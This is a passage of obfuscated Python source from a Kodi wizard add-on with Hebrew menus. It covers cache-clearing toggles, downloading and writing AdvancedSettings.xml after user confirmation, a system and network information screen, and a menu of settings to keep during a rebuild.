	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2913
	addFile ('Include Video Cache in Clear Cache: %s'%O00O0000OO0O00O00 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2914
	if O00O0000OO0O00O00 =='true':#line:2915
		addFile ('--- Include All Video Addons: %s'%O000OO0OO0OOO0000 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Bob: %s'%O000000O0OO000O0O .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Phoenix: %s'%OOOOOO0OOO00O00OO .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include Specto: %s'%OO0000OO0O0O0OO0O .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include Exodus: %s'%O0000OOO0O000OOOO .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Include Salts: %s'%O000O000OOO0OOO00 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Include Salts HD Lite: %s'%O0OO0OO0O0O00OOO0 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		addFile ('--- Include One Channel: %s'%O00O0O0000O0OO0OO .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2923
		addFile ('--- Include Genesis: %s'%OO0O0OO00O00000OO .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2924
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2925
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2926
	setView ('files','viewType')#line:2927
def advancedWindow (url =None ):#line:2929
	if not ADVANCEDFILE =='http://':#line:2930
		if url ==None :#line:2931
			OOOO0OOO0000O0O00 =wiz .workingURL (ADVANCEDFILE )#line:2932
			OO00OO00O0000OOO0 =uservar .ADVANCEDFILE #line:2933
		else :#line:2934
			OOOO0OOO0000O0O00 =wiz .workingURL (url )#line:2935
			OO00OO00O0000OOO0 =url #line:2936
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2937
		if os .path .exists (ADVANCED ):#line:2938
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2939
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2940
		if OOOO0OOO0000O0O00 ==True :#line:2941
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2942
			OOOO000OO0O0000O0 =wiz .openURL (OO00OO00O0000OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2943
			OOO000O0OOO0O0O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOO000OO0O0000O0 )#line:2944
			if len (OOO000O0OOO0O0O0O )>0 :#line:2945
				for OO0OOOOO00O00OOO0 ,OOO0OO0OO0O0OO00O ,url ,OO000000O00OOO0O0 ,O000OO0OOOO0OO000 ,OOOOO00OO0O00O00O in OOO000O0OOO0O0O0O :#line:2946
					if OOO0OO0OO0O0OO00O .lower ()=="yes":#line:2947
						addDir ("[B]%s[/B]"%OO0OOOOO00O00OOO0 ,'advancedsetting',url ,description =OOOOO00OO0O00O00O ,icon =OO000000O00OOO0O0 ,fanart =O000OO0OOOO0OO000 ,themeit =THEME3 )#line:2948
					else :#line:2949
						addFile (OO0OOOOO00O00OOO0 ,'writeadvanced',OO0OOOOO00O00OOO0 ,url ,description =OOOOO00OO0O00O00O ,icon =OO000000O00OOO0O0 ,fanart =O000OO0OOOO0OO000 ,themeit =THEME2 )#line:2950
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2951
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0OOO0000O0O00 )#line:2952
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2953
def writeAdvanced (OOOO0OO0OOOOOOO00 ,O000O000OOO0O00OO ):#line:2955
	OOOOOO000OO00O0OO =wiz .workingURL (O000O000OOO0O00OO )#line:2956
	if OOOOOO000OO00O0OO ==True :#line:2957
		if os .path .exists (ADVANCED ):OOO0OOOO0000O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO0OOOOOOO00 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2958
		else :OOO0OOOO0000O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO0OOOOOOO00 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2959
		if OOO0OOOO0000O0O00 ==1 :#line:2961
			O0O0OOO0OO0OOO0OO =wiz .openURL (O000O000OOO0O00OO )#line:2962
			O00OO0000OO0O0000 =open (ADVANCED ,'w');#line:2963
			O00OO0000OO0O0000 .write (O0O0OOO0OO0OOO0OO )#line:2964
			O00OO0000OO0O0000 .close ()#line:2965
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2966
			wiz .killxbmc (True )#line:2967
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2968
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOOO000OO00O0OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2969
def viewAdvanced ():#line:2971
	O0000000O000OO00O =open (ADVANCED )#line:2972
	OOOOO00O00O0OO00O =O0000000O000OO00O .read ().replace ('\t','    ')#line:2973
	wiz .TextBox (ADDONTITLE ,OOOOO00O00O0OO00O )#line:2974
	O0000000O000OO00O .close ()#line:2975
def removeAdvanced ():#line:2977
	if os .path .exists (ADVANCED ):#line:2978
		wiz .removeFile (ADVANCED )#line:2979
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2980
def showAutoAdvanced ():#line:2982
	notify .autoConfig ()#line:2983
def getIP ():#line:2985
	OOO0OO0O00O00O000 ='http://whatismyipaddress.com/'#line:2986
	if not wiz .workingURL (OOO0OO0O00O00O000 ):return 'Unknown','Unknown','Unknown'#line:2987
	OOO000O00OOOO0O00 =wiz .openURL (OOO0OO0O00O00O000 ).replace ('\n','').replace ('\r','')#line:2988
	if not 'Access Denied'in OOO000O00OOOO0O00 :#line:2989
		OOOO00O000O0O00OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO000O00OOOO0O00 )#line:2990
		OO000OOO00OO000O0 =OOOO00O000O0O00OO [0 ]if (len (OOOO00O000O0O00OO )>0 )else 'Unknown'#line:2991
		O00000O0O0OOOOO00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO000O00OOOO0O00 )#line:2992
		O00000O00O0OO0O0O =O00000O0O0OOOOO00 [0 ]if (len (O00000O0O0OOOOO00 )>0 )else 'Unknown'#line:2993
		OOO0OO000000OO0OO =O00000O0O0OOOOO00 [1 ]+', '+O00000O0O0OOOOO00 [2 ]+', '+O00000O0O0OOOOO00 [3 ]if (len (O00000O0O0OOOOO00 )>2 )else 'Unknown'#line:2994
		return OO000OOO00OO000O0 ,O00000O00O0OO0O0O ,OOO0OO000000OO0OO #line:2995
	else :return 'Unknown','Unknown','Unknown'#line:2996
def systemInfo ():#line:2998
	OOO0OOO00OO0O000O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3012
	OO00OO000OO000OOO =[];OO0000OO00O000OO0 =0 #line:3013
	for O00OOO0O000O00O0O in OOO0OOO00OO0O000O :#line:3014
		O0OO0OO0OO0000O00 =wiz .getInfo (O00OOO0O000O00O0O )#line:3015
		O0O000O0OO00OOO0O =0 #line:3016
		while O0OO0OO0OO0000O00 =="Busy"and O0O000O0OO00OOO0O <10 :#line:3017
			O0OO0OO0OO0000O00 =wiz .getInfo (O00OOO0O000O00O0O );O0O000O0OO00OOO0O +=1 ;wiz .log ("%s sleep %s"%(O00OOO0O000O00O0O ,str (O0O000O0OO00OOO0O )));xbmc .sleep (1000 )#line:3018
		OO00OO000OO000OOO .append (O0OO0OO0OO0000O00 )#line:3019
		OO0000OO00O000OO0 +=1 #line:3020
	O0OOO0O0O0O000O00 =OO00OO000OO000OOO [8 ]if 'Una'in OO00OO000OO000OOO [8 ]else wiz .convertSize (int (float (OO00OO000OO000OOO [8 ][:-8 ]))*1024 *1024 )#line:3021
	OO0OOOO0OOO0O0O00 =OO00OO000OO000OOO [9 ]if 'Una'in OO00OO000OO000OOO [9 ]else wiz .convertSize (int (float (OO00OO000OO000OOO [9 ][:-8 ]))*1024 *1024 )#line:3022
	OO00OOOO000O0000O =OO00OO000OO000OOO [10 ]if 'Una'in OO00OO000OO000OOO [10 ]else wiz .convertSize (int (float (OO00OO000OO000OOO [10 ][:-8 ]))*1024 *1024 )#line:3023
	OO0O0O0OO00000000 =wiz .convertSize (int (float (OO00OO000OO000OOO [11 ][:-2 ]))*1024 *1024 )#line:3024
	O0OOOO0OO0O0OOO0O =wiz .convertSize (int (float (OO00OO000OO000OOO [12 ][:-2 ]))*1024 *1024 )#line:3025
	OO00OO0OOO000OOO0 =wiz .convertSize (int (float (OO00OO000OO000OOO [13 ][:-2 ]))*1024 *1024 )#line:3026
	O0OO00O00OO0OO0O0 ,OO000OOOO0O000000 ,OO0OO0O000000OOOO =getIP ()#line:3027
	O00O00O0O00O0O000 =[];OOOO000OOO00O0O00 =[];OO0O00OO0OO0O0O0O =[];OO0OOOOO0OO00OOO0 =[];O00OOO0O0OO0000O0 =[];O000OO00O00OO0O00 =[];OO0O0O0O0OO0OOOOO =[]#line:3029
	O000O0O0OO0000OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3031
	for OOO0OO00OO0OOO0OO in sorted (O000O0O0OO0000OO0 ,key =lambda O00OO00O0O00O0O0O :O00OO00O0O00O0O0O ):#line:3032
		O0000O00OOOOO0O00 =os .path .split (OOO0OO00OO0OOO0OO [:-1 ])[1 ]#line:3033
		if O0000O00OOOOO0O00 =='packages':continue #line:3034
		OOOOOO0OO00O0O0O0 =os .path .join (OOO0OO00OO0OOO0OO ,'addon.xml')#line:3035
		if os .path .exists (OOOOOO0OO00O0O0O0 ):#line:3036
			OOO0OO0OOOO000O0O =open (OOOOOO0OO00O0O0O0 )#line:3037
			OOO00O000OO0O0O0O =OOO0OO0OOOO000O0O .read ()#line:3038
			OO0O000O0OOO0O000 =re .compile ("<provides>(.+?)</provides>").findall (OOO00O000OO0O0O0O )#line:3039
			if len (OO0O000O0OOO0O000 )==0 :#line:3040
				if O0000O00OOOOO0O00 .startswith ('skin'):OO0O0O0O0OO0OOOOO .append (O0000O00OOOOO0O00 )#line:3041
				if O0000O00OOOOO0O00 .startswith ('repo'):O00OOO0O0OO0000O0 .append (O0000O00OOOOO0O00 )#line:3042
				else :O000OO00O00OO0O00 .append (O0000O00OOOOO0O00 )#line:3043
			elif not (OO0O000O0OOO0O000 [0 ]).find ('executable')==-1 :OO0OOOOO0OO00OOO0 .append (O0000O00OOOOO0O00 )#line:3044
			elif not (OO0O000O0OOO0O000 [0 ]).find ('video')==-1 :OO0O00OO0OO0O0O0O .append (O0000O00OOOOO0O00 )#line:3045
			elif not (OO0O000O0OOO0O000 [0 ]).find ('audio')==-1 :OOOO000OOO00O0O00 .append (O0000O00OOOOO0O00 )#line:3046
			elif not (OO0O000O0OOO0O000 [0 ]).find ('image')==-1 :O00O00O0O00O0O000 .append (O0000O00OOOOO0O00 )#line:3047
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3051
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3052
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3053
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3054
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0O0O000O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0OOO0O0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOO000O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0OO00000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0OO0O0OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO0OOO000OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O00OO0OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OOOO0O000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000000OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO000OO000OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	OO00OOO00000OOO00 =len (O00O00O0O00O0O000 )+len (OOOO000OOO00O0O00 )+len (OO0O00OO0OO0O0O0O )+len (OO0OOOOO0OO00OOO0 )+len (O000OO00O00OO0O00 )+len (OO0O0O0O0OO0OOOOO )+len (O00OOO0O0OO0000O0 )#line:3077
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00OOO00000OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00OO0OO0O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOOOO0OO00OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO000OOO00O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00O0O00O0O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3082
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO0O0OO0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3083
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0O0O0OO0OOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3084
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OO00O00OO0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3085
def Menu ():#line:3086
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3087
def saveMenu ():#line:3089
	O000OOO000000O000 ='[COLOR yellow]מופעל[/COLOR]';OO0OOOOOO000OO00O ='[COLOR blue]מבוטל[/COLOR]'#line:3091
	OO00O000000OO0000 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3092
	O000O00OO0OOOO0OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3093
	O0OO0OOOO000OO0O0 ='true'if KEEPINFO =='true'else 'false'#line:3094
	O00OO00O0O0000000 ='true'if KEEPSOUND =='true'else 'false'#line:3096
	OOO000O00O00OO0O0 ='true'if KEEPVIEW =='true'else 'false'#line:3097
	O00O0O0000O00000O ='true'if KEEPSKIN =='true'else 'false'#line:3098
	OOO00OOO0OO0OOOOO ='true'if KEEPSKIN2 =='true'else 'false'#line:3099
	OOOOO0000O00O0O00 ='true'if KEEPSKIN3 =='true'else 'false'#line:3100
	O00OO00000OOOOOO0 ='true'if KEEPADDONS =='true'else 'false'#line:3101
	OO0O0O00OO0O0000O ='true'if KEEPPVR =='true'else 'false'#line:3102
	O0000OOO000O0O0O0 ='true'if KEEPTVLIST =='true'else 'false'#line:3103
	OOO00O0OO000O00O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3104
	O00OO000OO0OO000O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3105
	O00OO0OOO0OO0O00O ='true'if KEEPHUBTV =='true'else 'false'#line:3106
	OO00OOOOO00OOO0O0 ='true'if KEEPHUBVOD =='true'else 'false'#line:3107
	O0OO0OOOOOOOOO00O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3108
	O0OO0O00OOO0OO000 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3109
	OO0000OO00O0OO00O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3110
	OOOO0OOO0OOOOOO0O ='true'if KEEPHUBMENU =='true'else 'false'#line:3111
	O00OO00O0O0O00OOO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3112
	O0O0OOO0O0O0O0000 ='true'if KEEPTRAKT =='true'else 'false'#line:3113
	OO0O00O00O0O00O0O ='true'if KEEPREAL =='true'else 'false'#line:3114
	OOOOOO0OOO0OOO00O ='true'if KEEPRD2 =='true'else 'false'#line:3115
	O0OO0O00O00OOOO0O ='true'if KEEPTORNET =='true'else 'true'#line:3116
	OO0OO000O00OO00OO ='true'if KEEPLOGIN =='true'else 'false'#line:3117
	O00O00O0OOO00O0OO ='true'if KEEPSOURCES =='true'else 'false'#line:3118
	O0O00OO00O0O000O0 ='true'if KEEPADVANCED =='true'else 'false'#line:3119
	O000O000O0O000O0O ='true'if KEEPPROFILES =='true'else 'false'#line:3120
	OO00OO0000OO0O0O0 ='true'if KEEPFAVS =='true'else 'false'#line:3121
	O0O0OOO00O000OO0O ='true'if KEEPREPOS =='true'else 'false'#line:3122
	O0O0O0OO0OOO00OO0 ='true'if KEEPSUPER =='true'else 'false'#line:3123
	OOO0O0O0O0OO00000 ='true'if KEEPWHITELIST =='true'else 'false'#line:3124
	OO00OO000O0000OOO ='true'if KEEPWEATHER =='true'else 'false'#line:3125
	O0OO00OO00OO0O00O ='true'if KEEPVICTORY =='true'else 'false'#line:3126
	O0O000000O00OOOO0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3127
	if OOO0O0O0O0OO00000 =='true':#line:3129
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3130
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3131
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3132
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3133
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון RD:  '%OO0O00O00O0O00O0O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טראקט:  '%O0O0OOO0O0O0O0000 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת מועדפים:  '%OO00OO0000OO0O0O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO0O0O00OO0O0000O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OO00OO00OO0O00O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת חשבון טלמדיה:  '%O0O000000O00OOOO0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0000OOO000O0O0O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח סרטים:  '%OOO00O0OO000O00O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח סדרות:  '%O00OO000OO0OO000O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח טלויזיה:  '%O00OO0OOO0OO0O00O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO00OOOOO00OOO0O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת אריח ספורט:  '%O0OO0OOOOOOOOO00O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת אריח ילדים:  '%O0OO0O00OOO0OO000 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת אריח מוסיקה:  '%OO0000OO00O0OO00O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOO0OOO0OOOOOO0O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת כל האריחים בסקין:  '%O00O0O0000O00000O .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3154
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO00OO000O0000OOO .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00OO00000OOOOOO0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OO0OOOO000OO0O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3162
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O000O00OO0OOOO0OO .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3165
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00O00O0OOO00O0OO .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O00OO00O0O0000000 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3167
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OOO000O00O00OO0O0 .replace ('true',O000OOO000000O000 ).replace ('false',OO0OOOOOO000OO00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3169
